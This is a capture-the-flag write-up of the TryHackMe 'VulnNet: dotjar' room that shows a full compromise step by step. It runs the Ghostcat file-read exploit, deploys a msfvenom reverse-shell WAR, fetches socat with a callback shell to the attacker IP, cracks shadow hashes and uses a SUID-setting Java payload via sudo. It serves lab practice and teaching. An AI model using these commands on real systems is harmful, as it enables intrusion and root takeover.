# VulnNet: dotjar

## Introduction

Welcome to my another writeup! In this TryHackMe [VulnNet: dotjar](https://tryhackme.com/room/vulnnetdotjar) room, you'll learn: Exploiting Apache Tomcat and Apache JServ Protocol, writing a Java programme to escalate privilege, Docker breakout and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: web to jdk-admin](#privilege-escalation)**
4. **[Privilege Escalation: jdk-admin to root](#jdk-admin-to-root)**
5. **[Conclusion](#conclusion)**

## Background

> VulnNet Entertainment never gives up... are you ready?
>  
> Difficulty: Medium

---

VulnNet Entertainment works with the best and this is why they choose you again to perform a penetration test of their newly deployed service. Get ready!

- Difficulty: Medium
- Web Language: Java

A new machine means a new web implementation. Foothold should be rather easy-going as long as you connect the dots. Privilege escalation might depend on your Java knowledge, don't worry though, I'm rather a person who avoids Java and I still had a lot of fun working on this machine.

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|13:37:51(HKT)]
└> export RHOSTS=10.10.203.203
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|13:37:54(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

According to `rustscan` result, we have 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|8009              | Apache Jserv (Protocol v1.3)  |
|8080              | Apache Tomcat 9.0.30          |

### Apache JServ Protocol (AJP) on Port 8009

> AJP is a wire protocol. It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible, but proxy the request to Tomcat for Tomcat related content.

According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp#cve-2020-1938-ghostcat), If the AJP port is exposed, Tomcat might be susceptible to the **Ghostcat vulnerability**.

Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like `WEB-INF/web.xml` which can leak important information like credentials for the Tomcat interface, depending on the server setup.

Patched versions at or above 9.0.31, 8.5.51, and 7.0.100 have fixed this issue.

**We can use `searchsploit` to search that exploit:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|13:46:23(HKT)]
└> searchsploit apache tomcat      
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
[...]
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                    | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)      | multiple/webapps/49039.rb
[...]
```

**Let's mirror that Python exploit:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|13:46:26(HKT)]
└> searchsploit -m 48143     
  Exploit: Apache Tomcat - AJP 'Ghostcat File Read/Inclusion
      URL: https://www.exploit-db.com/exploits/48143
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48143.py
    Codes: CVE-2020-1938
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /root/ctf/thm/ctf/VulnNet-dotjar/48143.py
```

**After getting a better understanding of the exploit script, we can run it:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|13:50:03(HKT)]
└> python2 48143.py $RHOSTS
Getting resource at ajp13://10.10.203.203:8009/asdf
----------------------------
[...]
  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:{Redacted}
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>
[...]
```

The default file to fetch is `WEB-INF/web.xml`, which can leak important information like credentials for the Tomcat interface.

**We indeed found a credentials:**
```xml
[...]
3. Developer access is granted with the credentials provided below:
 
    webdev:{Redacted}
 
GUI access is disabled for security reasons.
[...]
```

### HTTP on Port 8080

**Adding a new host to `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|13:40:45(HKT)]
└> echo "$RHOSTS vulnnet-dotjar.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135401.png)

An Apache Tomcat home page, and it's version is 9.0.30.

**Now, since we have a credentials, we can try to login to the "Manager App":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135657.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135704.png)

As expected, it needs HTTP basic authentication.

Let's type the credentials that we've found:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135747.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135757.png)

It's correct, but the `webdev` account doesn't have access to the manager app.

**How about the "Host Manager"?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135913.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123135929.png)

It worked!!

However, nothing we can do... As we can't deploy a `.war` file to execute code.

## Initial Foothold

Let's take a step back.

In the Ghostcat LFI exploit, we found `webdev` credentials, and it says:

> "GUI access is disabled for security reasons."

Which means we couldn't access to the manager app.

After fumbling around, I found that **although we don't have access to the GUI one, we can still deploy a `.war` file to the manager app via `curl`!**

**According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#limitations), we can do this via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-dotjar/images/Pasted%20image%2020230123144004.png)

```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```

Let's do that!

- Generating a WAR reverse shell via `msfvenom`:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:41:07(HKT)]
└> msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o revshell.war
```

- Deploy the WAR reverse shell via `curl`:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:41:43(HKT)]
└> curl --upload-file revshell.war -u 'webdev:{Redacted}' 'http://vulnnet-dotjar.thm:8080/manager/text/deploy?path=/revshell'
OK - Deployed application at context path [/revshell]
```

- Setup a `nc` listener:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:42:54(HKT)]
└> nc -lnvp 443          
listening on [any] 443 ...
```

- Trigger the reverse shell:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:46:36(HKT)]
└> unzip revshell.war 
Archive:  revshell.war
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: wrienossjrk.jsp
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:48:36(HKT)]
└> curl http://vulnnet-dotjar.thm:8080/revshell/wrienossjrk.jsp
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:48:20(HKT)]
└> nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.203.203] 33058
whoami;hostname;id;ip a
web
vulnnet-dotjar
uid=1001(web) gid=1001(web) groups=1001(web)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:c1:df:0d:d2:ad brd ff:ff:ff:ff:ff:ff
    inet 10.10.203.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2901sec preferred_lft 2901sec
    inet6 fe80::c1:dfff:fe0d:d2ad/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `web`!

**Stable shell via `socat`:**
```shell
┌[root♥siunam]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.01.23|14:50:01(HKT)]-[git://master ✗]
└> python3 -m http.server 80                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:48:44(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/01/23 14:50:29 socat[51373] N opening character device "/dev/pts/2" for reading and writing
2023/01/23 14:50:29 socat[51373] N listening on AF=2 0.0.0.0:4444
```

```shell
wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|14:48:44(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/01/23 14:50:29 socat[51373] N opening character device "/dev/pts/2" for reading and writing
2023/01/23 14:50:29 socat[51373] N listening on AF=2 0.0.0.0:4444
                                                                 2023/01/23 14:50:39 socat[51373] N accepting connection from AF=2 10.10.203.203:57598 on AF=2 10.9.0.253:4444
                                                                   2023/01/23 14:50:39 socat[51373] N starting data transfer loop with FDs [5,5] and [7,7]
                                               web@vulnnet-dotjar:/$ 
web@vulnnet-dotjar:/$ export TERM=xterm-256color
web@vulnnet-dotjar:/$ stty rows 22 columns 107
web@vulnnet-dotjar:/$ ^C
web@vulnnet-dotjar:/$ 
```

## Privilege Escalation

### web to jdk-admin

Let's do some basic enumerations!

**System users:**
```shell
web@vulnnet-dotjar:/$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
jdk-admin:x:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash

web@vulnnet-dotjar:/$ ls -lah /home
total 16K
drwxr-xr-x  4 root      root      4.0K Jan 15  2021 .
drwxr-xr-x 23 root      root      4.0K Jan 15  2021 ..
drwxr-x--- 17 jdk-admin jdk-admin 4.0K Jan 31  2021 jdk-admin
drwxr-xr-x  4 web       web       4.0K Jan 16  2021 web
```

- Found 2 system user: `jdk-admin`, `web`

**Listening ports:**
```shell
web@vulnnet-dotjar:/$ ss -tunlp
NetidState  Recv-Q  Send-Q         Local Address:Port    Peer Address:Port                                 
udp  UNCONN 0       0                    0.0.0.0:5353         0.0.0.0:*                                    
udp  UNCONN 0       0                    0.0.0.0:49400        0.0.0.0:*                                    
udp  UNCONN 0       0              127.0.0.53%lo:53           0.0.0.0:*                                    
udp  UNCONN 0       0         10.10.203.203%eth0:68           0.0.0.0:*                                    
udp  UNCONN 0       0                       [::]:5353            [::]:*                                    
udp  UNCONN 0       0                       [::]:38227           [::]:*                                    
tcp  LISTEN 0       128            127.0.0.53%lo:53           0.0.0.0:*                                    
tcp  LISTEN 0       1         [::ffff:127.0.0.1]:8005               *:*     users:(("java",pid=408,fd=85)) 
tcp  LISTEN 0       100                        *:8009               *:*     users:(("java",pid=408,fd=69)) 
tcp  LISTEN 0       100                        *:8080               *:*     users:(("java",pid=408,fd=63))
```

**`/etc/shadow` backup in `/var/backup`:**
```shell
web@vulnnet-dotjar:/$ ls -lah /var/backups/
total 2.6M
drwxr-xr-x  2 root root   4.0K Jan 23 08:13 .
drwxr-xr-x 13 root root   4.0K Jan 15  2021 ..
[...]
-rw-------  1 root root    857 Jan 15  2021 group.bak
-rw-------  1 root shadow  711 Jan 15  2021 gshadow.bak
-rw-------  1 root root   1.8K Jan 15  2021 passwd.bak
-rw-r--r--  1 root root    485 Jan 16  2021 shadow-backup-alt.gz
-rw-------  1 root shadow 1.2K Jan 16  2021 shadow.bak
```

**Let's transfer the `shadow-backup-alt.gz` to our attacker machine!**
```shell
web@vulnnet-dotjar:/$ cd /var/backups/
web@vulnnet-dotjar:/var/backups$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|15:16:31(HKT)]
└> wget http://$RHOSTS:8000/shadow-backup-alt.gz
```

**Then use `gunzip` to decompress the `gz` file:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|15:16:41(HKT)]
└> gunzip shadow-backup-alt.gz
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|15:17:34(HKT)]
└> cat shadow-backup-alt                        
root:$6$F{Redacted}:18643:0:99999:7:::
[...]
jdk-admin:$6$P{Redacted}:18643:0:99999:7:::
web:$6$hmf.N2Bt$F{Redacted}:18643:0:99999:7:::
```

It's a `/etc/shadow` file!

**Let's crack those password hashes:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/VulnNet-dotjar)-[2023.01.23|15:17:36(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt shadow-backup-alt
[...]
{Redacted}        (jdk-admin)
```

Cracked user `jdk-admin` password!

**Let's Switch User to `jdk-admin`:**
```shell
web@vulnnet-dotjar:/var/backups$ su jdk-admin
Password: 
jdk-admin@vulnnet-dotjar:/var/backups$ whoami;hostname;id;ip a
jdk-admin
vulnnet-dotjar
uid=1000(jdk-admin) gid=1000(jdk-admin) groups=1000(jdk-admin),24(cdrom)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:1a:e0:76:d2:87 brd ff:ff:ff:ff:ff:ff
    inet 10.10.203.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3354sec preferred_lft 3354sec
    inet6 fe80::1a:e0ff:fe76:d287/64 scope link 
       valid_lft forever preferred_lft forever
jdk-admin@vulnnet-dotjar:/var/backups$ 
```

I'm user `jdk-admin`!

**user.txt:**
```shell
jdk-admin@vulnnet-dotjar:/var/backups$ cat /home/jdk-admin/user.txt 
THM{Redacted}
```

### jdk-admin to root

**Sudo permission:**
```shell
jdk-admin@vulnnet-dotjar:/var/backups$ sudo -l
[...]
Password: 
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
```

As you can see, user `jdk-admin` can run `/usr/bin/java -jar *.jar` as root!

**Now, since it enables us to execute any `.jar` file, we can create our own evil `.jar` file!!** (From [this blog](https://mkyong.com/java/how-to-execute-shell-command-from-java/))
```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("chmod +s /bin/bash");

            StringBuilder output = new StringBuilder();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }

            int exitVal = process.waitFor();
            if (exitVal == 0) {
                System.out.println("Success!");
                System.out.println(output);
                System.exit(0);
            } else {
                //abnormal...
            }

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```

This Java code will add a SUID sticky bit to `/bin/bash`, which allows us to spawn a root Bash shell.

- Create an evil Java file:

```shell
jdk-admin@vulnnet-dotjar:/var/backups$ cd /tmp
jdk-admin@vulnnet-dotjar:/tmp$ nano Main.java
```

- Compile it: (From [this blog](https://www.baeldung.com/java-create-jar))

```shell
jdk-admin@vulnnet-dotjar:/tmp$ javac Main.java
jdk-admin@vulnnet-dotjar:/tmp$ ls -lah
[...]
-rw-rw-r--  1 jdk-admin jdk-admin 1.4K Jan 23 08:50 Main.class
```

- Java Archive (JAR) it:

```shell
jdk-admin@vulnnet-dotjar:/tmp$ jar cfe Main.jar Main Main.class
```

- Execute it via `sudo`:

```shell
jdk-admin@vulnnet-dotjar:/tmp$ sudo /usr/bin/java -jar Main.jar 
Success!

```

- Verify the payload worked:

```shell
jdk-admin@vulnnet-dotjar:/tmp$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Apr  4  2018 /bin/bash
```

**It worked! Let's spawn a root Bash shell!**
```shell
jdk-admin@vulnnet-dotjar:/tmp$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
vulnnet-dotjar
uid=1000(jdk-admin) gid=1000(jdk-admin) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(jdk-admin)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:1a:e0:76:d2:87 brd ff:ff:ff:ff:ff:ff
    inet 10.10.203.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1871sec preferred_lft 1871sec
    inet6 fe80::1a:e0ff:fe76:d287/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
bash-4.4# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Exploiting Apache JServ Protocol (ASP) Ghostcat Vulnerability
2. Deploying `.war` Reverse Shell In Apache Tomcat Manager App Via `curl`
3. Cracking `/etc/shadow` Password Hash
4. Horizontal Privilege Escalation Via Misconfigurated Sudo Permission & Executing A Java Programme